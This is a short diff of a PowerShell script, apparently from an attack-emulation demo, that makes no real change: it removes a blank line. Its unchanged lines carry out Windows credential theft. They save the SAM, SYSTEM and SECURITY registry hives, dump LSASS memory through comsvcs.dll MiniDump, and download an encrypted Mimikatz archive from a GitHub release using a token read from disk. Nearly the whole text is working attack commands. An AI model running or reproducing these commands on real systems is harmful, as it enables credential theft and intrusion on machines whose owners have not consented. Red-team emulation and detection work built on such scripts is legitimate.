@@ -1,5 +1,4 @@
 Remove-Item $env:TEMP\mimihash.txt, $env:TEMP\lsass.dmp, $env:TEMP\SAM.dmp, $env:TEMP\SYSTEM.dmp, $env:TEMP\SECURITY.dmp -ErrorAction SilentlyContinue
-
 cmd.exe /c "reg.exe save hklm\security %TEMP%\SECURITY.dmp & reg.exe save hklm\system %TEMP%\SYSTEM.dmp & reg.exe save hklm\sam %TEMP%\SAM.dmp"
 C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
 $tkn= Get-Content "C:\CRDemo\tkn.txt"; $proxy_url = Get-Content 'C:\CRDemo\proxy.txt'; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Proxy $proxy_url -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
